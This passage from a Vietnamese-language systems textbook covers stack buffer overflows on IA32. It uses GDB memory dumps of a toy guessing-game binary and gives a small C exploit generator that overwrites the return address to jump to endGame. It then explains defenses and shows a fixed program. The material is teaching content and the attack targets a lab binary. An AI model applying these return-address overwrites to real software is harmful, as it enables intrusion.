<p>Hãy nhớ rằng code hex của các ký tự số từ <code>'0'</code> đến <code>'9'</code> là từ <code>0x30</code> đến <code>0x39</code>, và mỗi ô nhớ trên stack dài 4 byte.<br />
Frame pointer cách stack pointer 56 byte.<br />
Bạn có thể xác nhận giá trị của <code>%ebp</code> bằng GDB với lệnh:</p>
<pre><code>p $ebp
</code></pre>
<p>Trong ví dụ này, <code>%ebp</code> có giá trị <code>0xffffd428</code>.<br />
Lệnh sau cho phép xem 64 byte (dạng hex) bên dưới <code>%esp</code>:</p>
<pre><code>(gdb) x /64bx $esp
</code></pre>
<p>Lệnh này sẽ cho kết quả tương tự như sau:</p>
<pre><code>0xffffd3f0:     0x1c    0x87    0x04    0x08    0x0c    0xd4    0xff    0xff
0xffffd3f8:     0x00    0xa0    0x04    0x08    0xb2    0x86    0x04    0x08
0xffffd400:     0x01    0x00    0x00    0x00    0xc4    0xd4    0xff    0xff
0xffffd408:     0xcc    0xd4    0xff    0xff    0x31    0x32    0x33    0x34
0xffffd410:     0x35    0x36    0x37    0x38    0x00    0x80    0x00    0x00
0xffffd418:     0x6b    0x86    0x04    0x08    0x00    0x80    0xfb    0xf7
0xffffd420:     0x60    0x86    0x04    0x08    0x00    0x00    0x00    0x00
0xffffd428:     0x00    0x00    0x00    0x00    0x43    0x5a    0xe1    0xf7
</code></pre>
<p>Mỗi dòng trong kết quả hiển thị đại diện cho hai từ 32-bit. Vì vậy, dòng đầu tiên biểu diễn các từ tại địa chỉ <code>0xffffd3f0</code> và <code>0xffffd3f4</code>. Nhìn vào đỉnh của stack, ta có thể thấy địa chỉ bộ nhớ trỏ tới chuỗi <code>&quot;%s&quot;</code> (hay <code>0x0804871c</code>), theo sau là địa chỉ của <code>buf</code> (hay <code>0xffffd40c</code>). Lưu ý rằng trong các hình minh họa của phần này, địa chỉ của <code>buf</code> được rút gọn thành <code>0x40c</code>.</p>
<div class="table-wrapper"><table><thead><tr><th></th><th></th></tr></thead><tbody>
<tr><td></td><td><strong>Các giá trị nhiều byte (multibyte) được lưu theo thứ tự little-endian</strong></td></tr>
<tr><td></td><td>&gt; Trong đoạn assembly trước đó, byte tại địa chỉ <code>0xfffffd3f0</code> là <code>0x1c</code>, byte tại <code>0xfffffd3f1</code> là <code>0x87</code>, byte tại <code>0xfffffd3f2</code> là <code>0x04</code>, và byte tại <code>0xfffffd3f3</code> là <code>0x08</code>. Tuy nhiên, <em>giá trị</em> 32-bit (tương ứng với địa chỉ bộ nhớ của chuỗi <code>&quot;%s&quot;</code>) tại địa chỉ <code>0xfffffd3f0</code> thực chất là <code>0x0804871c</code>. Hãy nhớ rằng vì x86 là hệ thống <a href="../C4-Binary/byte_order.html#_integer_byte_order">little-endian</a>, các byte của giá trị nhiều byte như địa chỉ sẽ được lưu theo thứ tự đảo ngược. Tương tự, các byte tương ứng với địa chỉ của mảng <code>buf</code> (<code>0xffffd40c</code>) cũng được lưu theo thứ tự đảo ngược tại địa chỉ <code>0xfffffd3f4</code>.</td></tr>
</tbody></table>
</div>
<p>Các byte liên quan đến địa chỉ <code>0xffffd40c</code> nằm trên cùng một dòng với các byte tại địa chỉ <code>0xffffd408</code>, và là từ thứ hai trên dòng đó. Vì mảng <code>buf</code> dài 12 byte, các phần tử của <code>buf</code> chiếm 12 byte từ địa chỉ <code>0xffffd40c</code> đến <code>0xffffd417</code>. Kiểm tra các byte tại những địa chỉ này cho kết quả:</p>
<pre><code>0xffffd408:     0xcc    0xd4    0xff    0xff    0x31    0x32    0x33    0x34
0xffffd410:     0x35    0x36    0x37    0x38    0x00    0x80    0x00    0x00
</code></pre>
<p>Tại đây, ta có thể thấy rõ biểu diễn hex của chuỗi nhập <code>12345678</code>. Byte kết thúc null <code>\0</code> xuất hiện ở vị trí byte ngoài cùng bên trái tại địa chỉ <code>0xffffd414</code>. Hãy nhớ rằng <code>scanf</code> sẽ kết thúc tất cả các chuỗi bằng một byte null.</p>
<p>Tất nhiên, <code>12345678</code> không phải là số bí mật. Đây là kết quả khi chạy <code>secret</code> với chuỗi nhập <code>12345678</code>:</p>
<pre><code>$ ./secret
Enter secret number:
12345678
You are so wrong!
$ echo $?
1
</code></pre>
<p>Lệnh <code>echo $?</code> in ra giá trị trả về của lệnh vừa chạy trong shell. Trong trường hợp này, chương trình trả về <code>1</code> vì số bí mật nhập vào sai. Theo quy ước, chương trình trả về <code>0</code> khi không có lỗi. Mục tiêu tiếp theo của chúng ta là tìm cách khiến chương trình thoát với giá trị trả về <code>0</code>, nghĩa là chúng ta thắng trò chơi.</p>
<h3 id="8104-buffer-overflow-lần-thử-đầu-tiên"><a class="header" href="#8104-buffer-overflow-lần-thử-đầu-tiên">8.10.4. Buffer Overflow: Lần thử đầu tiên</a></h3>
<p>Tiếp theo, hãy thử nhập chuỗi:</p>
<pre><code>1234567890123456789012345678901234
</code></pre>
<p>Kết quả:</p>
<pre><code>$ ./secret
Enter secret number:
1234567890123456789012345678901234
You are so wrong!
Segmentation fault (core dumped)
$ echo $?
139
</code></pre>
<p>Thú vị đấy! Lần này chương trình bị crash với lỗi segmentation fault, code trả về <code>139</code>. <strong>Hình 3</strong> cho thấy call stack của <code>main</code> ngay sau khi gọi <code>scanf</code> với chuỗi nhập mới này:</p>
<p><img src="_images/afterScanf2.png" alt="after2" /><br />
<strong>Hình 3.</strong> Call stack ngay sau khi gọi <code>scanf</code> với input <code>1234567890123456789012345678901234</code></p>
<p>Chuỗi nhập quá dài này không chỉ ghi đè giá trị tại địa chỉ <code>0x428</code>, mà còn tràn xuống ghi đè cả địa chỉ trả về (return address) bên dưới stack frame của <code>main</code>. Hãy nhớ rằng khi một hàm trả về, chương trình sẽ cố tiếp tục thực thi tại địa chỉ được lưu trong return address. Trong ví dụ này, chương trình cố chạy tiếp tại địa chỉ <code>0xf7003433</code> sau khi thoát <code>main</code>, nhưng địa chỉ này không tồn tại. Do đó, chương trình crash với segmentation fault.</p>
<p>Chạy lại chương trình trong GDB (<code>input.txt</code> chứa chuỗi nhập ở trên) sẽ cho thấy điều này rõ ràng:</p>
<pre><code>$ gdb secret
(gdb) break *0x804859b
(gdb) ni
(gdb) run &lt; input.txt
(gdb) x /64bx $esp
0xffffd3f0:     0x1c    0x87    0x04    0x08    0x0c    0xd4    0xff    0xff
0xffffd3f8:     0x00    0xa0    0x04    0x08    0xb2    0x86    0x04    0x08
0xffffd400:     0x01    0x00    0x00    0x00    0xc4    0xd4    0xff    0xff
0xffffd408:     0xcc    0xd4    0xff    0xff    0x31    0x32    0x33    0x34
0xffffd410:     0x35    0x36    0x37    0x38    0x39    0x30    0x31    0x32
0xffffd418:     0x33    0x34    0x35    0x36    0x37    0x38    0x39    0x30
0xffffd420:     0x31    0x32    0x33    0x34    0x35    0x36    0x37    0x38
0xffffd428:     0x39    0x30    0x31    0x32    0x33    0x34    0x00    0xf7
</code></pre>
<p>Có thể thấy chuỗi nhập đã vượt quá giới hạn của mảng <code>buf</code>, ghi đè lên tất cả các giá trị khác trên stack. Nói cách khác, chuỗi này đã tạo ra một <strong>buffer overrun</strong> và làm hỏng call stack, khiến chương trình crash. Quá trình này còn được gọi là <strong>smashing the stack</strong>.</p>
<h3 id="8105-buffer-overflow-thông-minh-hơn-lần-thử-thứ-hai"><a class="header" href="#8105-buffer-overflow-thông-minh-hơn-lần-thử-thứ-hai">8.10.5. Buffer Overflow thông minh hơn: Lần thử thứ hai</a></h3>
<p>Trong ví dụ đầu tiên, chúng ta đã “đập nát” stack bằng cách ghi đè thanh ghi <code>%ebp</code> và địa chỉ trả về bằng dữ liệu rác, khiến chương trình crash. Một kẻ tấn công chỉ muốn làm chương trình sập thì đến đây đã hài lòng. Tuy nhiên, mục tiêu của chúng ta là đánh lừa trò chơi đoán số để nó trả về <code>0</code>, nghĩa là chúng ta thắng. Ta có thể làm điều này bằng cách ghi đè stack bằng dữ liệu có ý nghĩa hơn là rác. Ví dụ: ta có thể thay địa chỉ trả về bằng địa chỉ của hàm <code>endGame</code>. Khi chương trình cố trả về từ <code>main</code>, nó sẽ chạy <code>endGame</code> thay vì crash với segmentation fault.</p>
<p>Để tìm địa chỉ của <code>endGame</code>, hãy mở lại <code>secret</code> trong GDB:</p>
<pre><code>$ gdb secret
(gdb) disas endGame
Dump of assembler code for function endGame:
    0x08048564 &lt;+0&gt;:     push   %ebp
    0x08048565 &lt;+1&gt;:     mov    %esp,%ebp
    0x08048567 &lt;+3&gt;:     sub    $0x18,%esp
    0x0804856a &lt;+6&gt;:     movl   $0x80486fe,(%esp)
    0x08048571 &lt;+13&gt;:    call   0x8048390 &lt;puts@plt&gt;
    0x08048576 &lt;+18&gt;:    movl   $0x0,(%esp)
    0x0804857d &lt;+25&gt;:    call   0x80483b0 &lt;exit@plt&gt;
End of assembler dump.
</code></pre>
<p>Một lần nữa, vì x86 là hệ thống <a href="../C4-Binary/byte_order.html#_integer_byte_order">little-endian</a> trong đó stack phát triển về phía địa chỉ thấp hơn, nên các byte trong địa chỉ trả về sẽ xuất hiện theo thứ tự đảo ngược.</p>
<p>Chương trình dưới đây minh họa cách một kẻ tấn công có thể tạo ra exploit như trên:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

char ebuff[]=
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30&quot; /* 10 byte rác đầu tiên */
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30&quot; /* 10 byte rác tiếp theo */
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30&quot; /* 10 byte rác tiếp theo nữa */
&quot;\x31\x32&quot;                                 /* 2 byte rác cuối */
&quot;\x64\x85\x04\x08&quot;                         /* địa chỉ của endGame (little-endian) */
;

int main(void) {
    int i;
    for (i = 0; i &lt; sizeof(ebuff); i++) { /* in từng ký tự */
        printf(&quot;%c&quot;, ebuff[i]);
    }
    return 0;
}
</code></pre>
<p>Ký tự <code>\x</code> trước mỗi số cho biết số đó được biểu diễn ở dạng giá trị thập lục phân của một ký tự. Sau khi định nghĩa <code>ebuff[]</code>, hàm <code>main</code> chỉ đơn giản in ra từng ký tự một.<br />
Để tạo chuỗi byte tương ứng, biên dịch và chạy chương trình như sau:</p>
<pre><code>$ gcc -o genEx genEx.c
$ ./genEx &gt; exploit
</code></pre>
<p>Để dùng file <code>exploit</code> làm input cho <code>scanf</code>, chỉ cần chạy <code>secret</code> với <code>exploit</code> như sau:</p>
<pre><code>$ ./secret &lt; exploit
Enter secret number:
You are so wrong!
You win!
</code></pre>
<p>Chương trình in ra <code>&quot;You are so wrong!&quot;</code> vì chuỗi trong <code>exploit</code> <strong>không</strong> phải là số bí mật. Tuy nhiên, chương trình cũng in <code>&quot;You win!&quot;</code>.<br />
Hãy nhớ rằng mục tiêu của chúng ta là đánh lừa chương trình trả về <code>0</code>. Trong một hệ thống lớn hơn, nơi trạng thái “thành công” được theo dõi bởi một chương trình bên ngoài, điều quan trọng nhất thường là giá trị trả về của chương trình, chứ không phải những gì nó in ra.</p>
<p>Kiểm tra giá trị trả về:</p>
<pre><code>$ echo $?
0
</code></pre>
<p>Exploit của chúng ta đã thành công! Chúng ta đã thắng trò chơi.</p>
<h3 id="8106-bảo-vệ-chống-lại-buffer-overflow"><a class="header" href="#8106-bảo-vệ-chống-lại-buffer-overflow">8.10.6. Bảo vệ chống lại Buffer Overflow</a></h3>
<p>Ví dụ trên đã thay đổi luồng điều khiển của file thực thi <code>secret</code>, buộc nó trả về giá trị 0 (thành công). Tuy nhiên, một exploit như vậy có thể gây ra thiệt hại thực sự.<br />
Hơn nữa, một số hệ thống máy tính cũ <strong>thực thi</strong> các byte từ bộ nhớ stack. Nếu kẻ tấn công đặt các byte tương ứng với lệnh assembly lên call stack, CPU sẽ diễn giải chúng như các lệnh <strong>thật</strong>, cho phép kẻ tấn công buộc CPU thực thi <strong>bất kỳ code tùy ý nào</strong>.</p>
<p>May mắn thay, các hệ thống hiện đại có nhiều chiến lược để làm cho việc khai thác buffer overflow trở nên khó khăn hơn:</p>
<ul>
<li>
<p><strong>Stack Randomization</strong>: Hệ điều hành cấp phát địa chỉ bắt đầu của stack tại một vị trí ngẫu nhiên trong bộ nhớ stack, khiến vị trí/kích thước của call stack thay đổi giữa các lần chạy. Nhiều máy chạy cùng một chương trình sẽ có địa chỉ stack khác nhau. Linux hiện đại dùng kỹ thuật này như một tiêu chuẩn. Tuy nhiên, kẻ tấn công kiên trì vẫn có thể brute force bằng cách thử nhiều địa chỉ khác nhau. Một mẹo phổ biến là dùng <strong>NOP sled</strong> — một dãy dài các lệnh <code>nop</code> (<code>0x90</code>) trước code exploit. Lệnh <code>nop</code> không làm gì ngoài việc tăng program counter sang lệnh tiếp theo. Miễn là CPU bắt đầu thực thi ở đâu đó trong NOP sled, nó sẽ trượt đến đoạn code exploit phía sau. Bài viết <em>Smashing the Stack for Fun and Profit</em> của Aleph One⁶ mô tả chi tiết cơ chế này.</p>
</li>
<li>
<p><strong>Stack corruption detection</strong>: Một biện pháp khác là phát hiện khi stack bị hỏng. Các phiên bản GCC gần đây dùng một cơ chế bảo vệ gọi là <strong>canary</strong> — một giá trị đóng vai trò như “chim hoàng yến” canh gác giữa buffer và các phần tử khác của stack. Canary được lưu ở vùng bộ nhớ không ghi đè được và được so sánh với giá trị đặt trên stack. Nếu canary “chết” trong quá trình chạy, chương trình biết mình đang bị tấn công và sẽ dừng với thông báo lỗi. Tuy nhiên, kẻ tấn công tinh vi có thể thay thế canary để tránh bị phát hiện.</p>
</li>
<li>
<p><strong>Giới hạn vùng có thể thực thi</strong>: Ở biện pháp này, code thực thi chỉ được phép nằm trong một số vùng bộ nhớ nhất định, nghĩa là call stack không còn khả năng thực thi. Tuy nhiên, biện pháp này cũng có thể bị vượt qua. Trong tấn công <strong>return-oriented programming</strong> (ROP), kẻ tấn công có thể “nhặt” các lệnh trong vùng thực thi và nhảy từ lệnh này sang lệnh khác để tạo thành exploit. Có nhiều ví dụ nổi tiếng về kỹ thuật này, đặc biệt trong các trò chơi điện tử⁷.</p>
</li>
</ul>
<p>Tuy nhiên, tuyến phòng thủ tốt nhất vẫn là lập trình viên.<br />
Để ngăn chặn buffer overflow trong chương trình của bạn, hãy dùng các hàm C có <strong>length specifier</strong> bất cứ khi nào có thể và thêm code kiểm tra giới hạn mảng. Điều quan trọng là các mảng được khai báo phải khớp với length specifier đã chọn.</p>
<p><strong>Bảng 1</strong> liệt kê một số hàm C “xấu” dễ bị buffer overflow và hàm “tốt” nên dùng thay thế (giả sử <code>buf</code> được cấp phát 12 byte):</p>
<div class="table-wrapper"><table><thead><tr><th>Thay vì:</th><th>Hãy dùng:</th></tr></thead><tbody>
<tr><td><code>gets(buf)</code></td><td><code>fgets(buf, 12, stdin)</code></td></tr>
<tr><td><code>scanf(&quot;%s&quot;, buf)</code></td><td><code>scanf(&quot;%12s&quot;, buf)</code></td></tr>
<tr><td><code>strcpy(buf2, buf)</code></td><td><code>strncpy(buf2, buf, 12)</code></td></tr>
<tr><td><code>strcat(buf2, buf)</code></td><td><code>strncat(buf2, buf, 12)</code></td></tr>
<tr><td><code>sprintf(buf, &quot;%d&quot;, num)</code></td><td><code>snprintf(buf, 12, &quot;%d&quot;, num)</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các hàm C với length specifier.</p>
<p>File nhị phân <code>secret2</code> (<a href="_attachments/secret2.tar.gz">secret2.tar.gz</a>) không còn lỗ hổng buffer overflow. Đây là hàm <code>main</code> của bản nhị phân mới này (<a href="_attachments/main2.c">main2.c</a>):</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &quot;other.h&quot; //contain secret function definitions

/*prints out the You Win! message*/
void endGame(void) {
    printf(&quot;You win!\n&quot;);
    exit(0);
}

/*main function of the game*/
int main(void) {
    int guess, secret, len;
    char buf[12]; //buffer (12 bytes long)

    printf(&quot;Enter secret number:\n&quot;);
    scanf(&quot;%12s&quot;, buf); //read guess from user input (fixed!)
    guess = atoi(buf); //convert to an integer

    secret=getSecretCode(); //call the getSecretCode function

    //check to see if guess is correct
    if (guess == secret) {
        printf(&quot;You got it right!\n&quot;);
    }
    else {
        printf(&quot;You are so wrong!\n&quot;);
        return 1; //if incorrect, exit
    }

    printf(&quot;Enter the secret string to win:\n&quot;);
    scanf(&quot;%12s&quot;, buf); //get secret string from user input (fixed!)

    guess = calculateValue(buf, strlen(buf)); //call calculateValue function

    //check to see if guess is correct
    if (guess != secret) {
        printf(&quot;You lose!\n&quot;);
        return 2; //if guess is wrong, exit
    }

    /*if both the secret string and number are correct
    call endGame()*/
    endGame();

    return 0;
}
</code></pre>
<p>Lưu ý rằng chúng ta đã thêm <strong>length specifier</strong> (chỉ định độ dài) vào tất cả các lời gọi <code>scanf</code>, khiến hàm <code>scanf</code> sẽ dừng đọc dữ liệu từ input sau khi đọc đủ 12 byte đầu tiên. Nhờ đó, chuỗi exploit không còn làm chương trình bị lỗi nữa:</p>
<pre><code>$ ./secret2 &lt; exploit
Enter secret number:
You are so wrong!
$ echo $?
1
</code></pre>
<p>Tất nhiên, bất kỳ ai có kỹ năng <strong>reverse engineering</strong> (kỹ thuật đảo ngược) cơ bản vẫn có thể thắng trò chơi đoán số bằng cách phân tích code assembly. Nếu bạn chưa thử đánh bại chương trình bằng reverse engineering, chúng tôi khuyến khích bạn thử ngay bây giờ.</p>
<h3 id="tài-liệu-tham-khảo"><a class="header" href="#tài-liệu-tham-khảo">Tài liệu tham khảo</a></h3>
<ol>
<li>
<p>Mohit Kumar. <a href="https://thehackernews.com/2017/06/skype-crash-bug.html">Critical Skype Bug Lets Hackers Remotely Execute Malicious Code</a>. 2017.</p>
</li>
<li>
<p>Tamir Zahavi-Brunner. <a href="https://blog.zimperium.com/cve-2017-13253-buffer-overflow-multiple-android-drm-services/">CVE-2017-13253: Buffer overflow in multiple Android DRM services</a>. 2018.</p>
</li>
<li>
<p>Tom Spring. <a href="https://threatpost.com/google-patches-high-severity-browser-bug/128661/">Google Patches 'High Severity' Browser Bug</a>. 2017.</p>
</li>
<li>
<p>Christopher Kelty. <a href="https://limn.it/articles/the-morris-worm/">The Morris Worm</a> Limn Magazine, Issue 1. Issue 1, Systemic Risk. 2011.</p>
</li>
<li>
<p>David Auerbach. <a href="https://nplusonemag.com/issue-19/essays/chat-wars/">Chat Wars: Microsoft vs. AOL</a> NplusOne Magazine, Issue 19. Spring 2014.</p>
</li>
<li>
<p>Aleph One. <a href="http://insecure.org/stf/smashstack.html">Smashing the Stack for Fun and Profit</a>. 1996.</p>
</li>
<li>
<p>DotsAreCool. <a href="https://youtu.be/vAHXK2wut_I">Super Mario World Credit Warp</a> (Nintendo ROP example). 2015.</p>
</li>
</ol>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../C8-IA32/structs.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                            <a rel="next" href="../C9-ARM64/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../C8-IA32/structs.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                    <a rel="next" href="../C9-ARM64/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="../book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
    </body>
</html>
